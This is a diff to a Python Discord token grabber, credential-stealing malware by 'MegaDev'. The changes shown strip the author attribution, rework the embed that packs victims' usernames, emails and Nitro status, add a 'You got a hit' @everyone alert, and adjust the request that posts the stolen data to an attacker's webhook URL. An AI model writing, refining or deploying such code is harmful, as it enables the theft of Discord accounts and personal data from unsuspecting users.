@@ -15,19 +15,12 @@ MODE = 'TEXT'
 EXPERIMENTAL= False
 
 '''
-Discord token grabber
-Made by Mega145 aka MegaDev
-v1.0
-https://github.com/mega145/Discord_token_grabber
-
-
 CHANGELOG:
 - added SEND_IP and SEND_PC_INFO options
 - added EMBED to MODE (not ready to use yet)
 - added EXPERIMANTAL bool
 - added getIP() function
 - added getUserInfo() function
-- updated README
 '''
 
 
@@ -168,21 +161,23 @@ def main():
                            nitro = True
                        else:
                            nitro = False
-                       user = f'{getUserInfo(token)["username"]}#{getUserInfo(token)["discriminator"]}\n'
-                       embed = {"title":user,'color':color,"fields":[
+                       user = f'{getUserInfo(token)["username"]}#{getUserInfo(token)["discriminator"]}'
+                       embed = {"title":user,"color":color,"description":"description","fields":[
                            {
                                "name":'**Discord Account Info**',
-                               'value':f"NAME: {user}\n EMAIL: {raw_user['email']}\nNitro: {nitro}\nCOUNTRY: {raw_user['locale']}"
+                               "value":f"NAME: {user}\nEMAIL: {raw_user['email']}\nNitro: {nitro}\n"
                            }
                        ]}
                        embeds.append(embed)
                     except:
                         pass
 
+        ping = '@everyone' if PING_ME else ''
+        message = {"username":"Token Grabber by MegaDev",'content':'You got a hit. ' + ping,"embeds":json.dumps(embeds)}
 
-        message = {"username":"Token Grabber by MegaDev","embeds":json.dumps(embeds)}
-
-        requests.post(WEBHOOK_URL,headers=headers,data=message)
+        print(message)
+        response = requests.post(WEBHOOK_URL,headers=headers,json=message)
+        print(response.text)
     else:
         print('MODE invalid or experimental is not enabled')
 if __name__ == '__main__':
